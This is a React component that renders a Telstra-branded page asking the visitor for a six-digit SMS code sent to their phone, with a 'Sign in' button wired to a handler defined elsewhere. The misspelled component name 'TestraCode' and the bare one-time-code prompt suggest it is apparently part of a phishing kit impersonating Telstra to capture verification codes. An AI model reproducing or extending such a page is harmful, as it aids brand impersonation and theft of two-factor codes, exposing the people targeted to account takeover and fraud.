import Button from "../UI/Button";
import Input from "../UI/Input";

import logo from "../../assets/telstra.PNG";


const TestraCode = ({ formData, handleInputChange, errors, handleNext, handleBlur, loading }) => {
  return (
    <div className="min-h-screen flex-1 bg-white flex items-center justify-center">

      <div className="flex fixed top-0 left-0 border-b shadow-xl border border-gray-300 w-full">          
        <div className="flex md:ml-24 ml-12 mt-2 py-2">
          <img src={logo} className="w-12 h-12" alt="company logo" />
        </div>
      </div>

      <div className="w-sm md:w-lg px-8 -mt-1">

        <div className="flex flex-col pb-12 mt-4">
          <h1 className="text-2xl font-semibold text-left">Enter the code that was sent to your number</h1>
          <p className="text-base font-medium pt-4"> <span className="text-red-800 font-bold text-2xl">* </span>6 digit code was sent to you it might take a few minute to arrive</p>
        </div>

        <Input
          label=""
          name="code"
          type="text"
          value={formData.code}
          placeholder="******"
          onChange={handleInputChange}
          error={errors.code}
          onBlur={handleBlur}
          className="border-2"
        />

        <div className="flex flex-col justify-end py-4 mt-4">

          {loading ?
          
            <Button
              onClick={() => {}}
              disabled={true}
              className="bg-gray-500 rounded-2xl mt-2 px-10 py-2 text-sm text-white w-full "
            >
              Sign in
            </Button>
            :
            <Button
              onClick={handleNext}
              disabled={errors.code || formData.code.length < 6 || !formData.code.trim()}
              className="bg-blue-500 rounded-2xl mt-2 px-10 py-2 text-sm text-white hover:bg-blue-600 transition-colors w-full "
            >
              Sign in
            </Button>
          }

        </div>

      </div>

    </div>
  );
};

export default TestraCode;
